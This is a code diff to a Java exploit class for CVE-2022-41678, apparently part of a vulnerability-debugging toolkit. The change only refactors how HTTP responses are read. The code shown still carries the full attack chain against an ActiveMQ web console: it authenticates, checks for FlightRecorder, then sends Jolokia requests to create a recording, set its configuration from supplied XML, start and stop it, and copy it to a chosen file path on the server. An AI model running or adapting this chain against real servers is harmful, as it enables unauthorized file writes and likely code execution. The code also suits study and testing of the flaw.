@@ -2,6 +2,7 @@ package cve;
 
 import com.alibaba.fastjson.JSONObject;
 import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
+import com.pacemrc.vuldebug.common.utils.http.Response;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 
@@ -23,9 +24,10 @@ public class CVE_2022_41678 {
         HttpGet httpGet = new HttpGet(url);
         httpGet.setHeader("Authorization","Basic " + authBase64);
         httpGet.setHeader("Origin","http://127.0.0.1:8161/");
-        String response = httpRequest.sendGet(httpGet);
+        Response response = httpRequest.sendGet(httpGet);
+        String responseBody = response.getResponseBody();
 
-        return response.indexOf("FlightRecorder") > 1;
+        return responseBody.indexOf("FlightRecorder") > 1;
 
     }
 
@@ -41,8 +43,9 @@ public class CVE_2022_41678 {
                 " \"operation\": \"newRecording\",\n" +
                 " \"arguments\": []\n" +
                 "}";
-        String response = httpRequest.sendStringPost(httpPost, body);
-        JSONObject json = (JSONObject) JSONObject.parse(response);
+        Response response = httpRequest.sendStringPost(httpPost, body);
+        String responseBody = response.getResponseBody();
+        JSONObject json = (JSONObject) JSONObject.parse(responseBody);
 
         HashMap<String, Integer> map = new HashMap<>();
         map.put("value",(int) json.get("value"));
@@ -65,8 +68,9 @@ public class CVE_2022_41678 {
                 " \"operation\": \"setConfiguration\",\n" +
                 " \"arguments\": [" + value + ",\"" + configXml + "\"]\n" +
                 "}";
-        String response = httpRequest.sendStringPost(httpPost, body);
-        JSONObject json = (JSONObject) JSONObject.parse(response);
+        Response response = httpRequest.sendStringPost(httpPost, body);
+        String responseBody = response.getResponseBody();
+        JSONObject json = (JSONObject) JSONObject.parse(responseBody);
 
         return (int)json.get("status") == 200;
     }
@@ -83,8 +87,9 @@ public class CVE_2022_41678 {
                 " \"operation\": \"startRecording\",\n" +
                 " \"arguments\": [" + value + "]\n" +
                 "}";
-        String response = httpRequest.sendStringPost(httpPost, body);
-        JSONObject json = (JSONObject) JSONObject.parse(response);
+        Response response = httpRequest.sendStringPost(httpPost, body);
+        String responseBody = response.getResponseBody();
+        JSONObject json = (JSONObject) JSONObject.parse(responseBody);
 
         return (int)json.get("status") == 200;
     }
@@ -101,8 +106,9 @@ public class CVE_2022_41678 {
                 " \"operation\": \"stopRecording\",\n" +
                 " \"arguments\": [" + value + "]\n" +
                 "}";
-        String response = httpRequest.sendStringPost(httpPost, body);
-        JSONObject json = (JSONObject) JSONObject.parse(response);
+        Response response = httpRequest.sendStringPost(httpPost, body);
+        String responseBody = response.getResponseBody();
+        JSONObject json = (JSONObject) JSONObject.parse(responseBody);
 
         return (int)json.get("status") == 200;
 
@@ -120,8 +126,9 @@ public class CVE_2022_41678 {
                 " \"operation\": \"copyTo\",\n" +
                 " \"arguments\": [" + value + ",\"" + filepath + "\"]\n" +
                 "}";
-        String response = httpRequest.sendStringPost(httpPost, body);
-        JSONObject json = (JSONObject) JSONObject.parse(response);
+        Response response = httpRequest.sendStringPost(httpPost, body);
+        String responseBody = response.getResponseBody();
+        JSONObject json = (JSONObject) JSONObject.parse(responseBody);
 
         return (int)json.get("status") == 200;
 
